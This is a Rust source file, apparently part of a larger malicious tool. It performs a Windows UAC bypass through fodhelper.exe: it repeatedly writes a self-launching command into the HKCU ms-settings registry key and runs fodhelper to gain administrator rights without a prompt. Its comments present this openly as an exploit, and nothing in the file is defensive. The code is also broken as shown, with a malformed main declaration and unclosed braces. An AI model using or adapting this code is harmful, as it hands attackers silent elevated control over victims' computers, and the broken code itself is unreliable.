use std::process::Command;
use std::thread;
use std::time::Duration;
extern crate is_elevated; // rustc has issues when compiling this external crate, use ```Cargo build``` insteand of rustc src/main.rs.
use is_elevated::is_elevated;
use std::env;

fn main{
        let _output = if cfg!(target_os = "windows") {
                if !is_elevated(){
                        // if the program doesn't have administrator privs, it uses fodhelper exploit to gain them.
                        println!("Getting admin privs...");
                        let exename = String::from(env::current_exe().unwrap().to_string_lossy());
                        let mut command = "cmd /c start cmd /c ".to_string();
                        command.push_str(&exename);
                        while 1==1{
                                // This while loop lags enough to probably let fodhelper work but I still reccomend adding cpu lagger
                                Command::new("reg.exe")
                                        .args(&["add","HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command","/v","DelegateExecute","/t","REG_SZ","/f"])
                                        .status()
                                        .expect("failed to execute process");
                                Command::new("reg.exe")
                                        .args(&["add","HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command","/d",&command,"/f"])
                                        .status()
                                        .expect("failed to execute process");
                                Command::new("cmd.exe")
                                        .args(["/c","start fodhelper.exe"])
                                        .status()
                                        .expect("failed to execute process");
                        }  
}
